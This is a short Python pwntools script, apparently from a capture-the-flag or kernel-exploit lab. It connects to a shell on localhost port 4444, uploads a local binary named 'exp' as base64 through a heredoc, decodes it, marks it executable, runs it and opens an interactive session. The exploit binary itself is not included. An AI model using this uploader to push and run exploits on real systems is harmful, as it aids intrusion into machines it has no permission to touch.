#/usr/bin/env python
from pwn import *

p = remote('localhost', 4444)

p.sendlineafter('/ # ', 'stty -echo')
p.sendlineafter('/ # ', 'cat << EOF > exp.b64')
p.sendline(read('exp').encode('base64'))
p.sendline("EOF")

p.sendlineafter('/ # ', 'base64 -d exp.b64 > exp')
p.sendlineafter('/ # ', 'chmod +x exp')
p.sendlineafter('/ # ', 'stty +echo')

p.sendlineafter('/ # ', './exp')

p.interactive()